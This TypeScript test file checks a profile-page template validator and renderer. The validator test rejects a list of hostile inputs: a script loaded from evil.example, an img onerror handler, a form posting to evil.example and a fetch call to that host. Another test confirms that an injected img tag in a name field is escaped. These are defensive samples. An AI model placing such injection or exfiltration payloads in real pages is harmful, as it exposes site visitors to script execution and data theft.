import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import { renderProfile, validateTemplate } from "../lib/profile-template";

const template = readFileSync(new URL("../templates/plantilla-ejemplo.html", import.meta.url), "utf8");
const tracker = readFileSync(new URL("../tracker/lazu-tracker.js", import.meta.url), "utf8");

test("la plantilla de ejemplo cumple el contrato", () => {
  assert.deepEqual(validateTemplate(template), []);
});

test("el validador rechaza lo que rompería la seguridad del perfil", () => {
  const withTracker = (body: string) =>
    `${body}<script>const LAZU_PROFILE_ID = "{{slug}}";/* LAZU-TRACKER:START *//* LAZU-TRACKER:END */</script>`;
  assert.equal(validateTemplate(withTracker("")).length, 0);
  for (const bad of [
    '<script src="https://evil.example/x.js"></script>',
    '<link rel="stylesheet" href="https://cdn.example/x.css">',
    '<img src=x onerror="alert(1)">',
    '<form action="https://evil.example">',
    "<script>fetch('https://evil.example')</script>",
    "<iframe src=x></iframe>",
    "{{secreto}}",
  ]) {
    assert.ok(validateTemplate(withTracker(bad)).length > 0, bad);
  }
  assert.ok(validateTemplate("<html></html>").length >= 2, "sin tracker ni LAZU_PROFILE_ID");
});

test("los datos del colaborador se escapan y los bloques opcionales desaparecen", () => {
  const html = renderProfile(
    template,
    { slug: "ana-norte", name: 'Ana <img src=x onerror="x">', company: "Norte & Co", whatsapp: "+52 1 55 1234 5678", email: null, phone: null },
    tracker,
  );
  assert.doesNotMatch(html, /<img src=x/);
  assert.match(html, /Ana &lt;img src=x onerror=&quot;x&quot;&gt;/);
  assert.match(html, /Norte &amp; Co/);
  assert.match(html, /https:\/\/wa\.me\/5215512345678\?/);
  assert.doesNotMatch(html, /href="mailto:/, "sin correo no hay botón de correo");
  assert.doesNotMatch(html, /\{\{/, "no quedan marcadores");
  assert.match(html, /const LAZU_PROFILE_ID = "ana-norte";/);
  assert.ok(html.includes(tracker.trim()), "lleva el tracker oficial");
  // Dentro de <script> los valores van como JSON sin poder cerrar la etiqueta.
  assert.match(html, /"FN:" \+ "Ana \\u003cimg/);
});
